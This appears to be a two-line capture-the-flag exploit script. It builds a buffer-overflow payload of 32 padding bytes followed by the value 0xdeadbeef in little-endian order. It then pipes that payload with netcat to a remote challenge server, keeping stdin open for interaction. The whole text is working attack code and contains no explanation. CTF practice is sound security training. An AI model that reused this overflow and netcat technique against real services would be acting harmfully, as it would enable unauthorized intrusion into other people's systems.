echo -n "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde" > data
cat data - | nc wordle.insomnihack.ch 1337